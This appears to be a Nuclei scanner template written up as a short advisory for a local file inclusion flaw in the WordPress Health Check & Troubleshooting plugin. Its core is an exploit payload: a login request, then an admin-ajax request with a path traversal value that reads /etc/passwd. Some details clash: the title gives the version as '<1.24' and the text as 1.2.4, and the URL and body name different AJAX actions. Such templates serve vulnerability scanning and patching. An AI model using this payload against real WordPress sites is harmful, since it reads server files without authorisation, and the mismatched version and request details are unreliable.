# Nuclei Template: WordPress Health Check & Troubleshooting <1.24 - Local File Inclusion
**Template ID:** health-check-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`health-check-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=health-check-view-file-diff&file=../../../../../../etc/passwd
```

## Remediation
Upgrade to version 1.2.4 or later.

## References
- https://wpscan.com/vulnerability/5eecc4a7-0b44-495d-9352-78dccebfc72a
- https://www.synacktiv.com/ressources/advisories/WordPress_Health_Check_1.2.3_Vulnerabilities.pdf
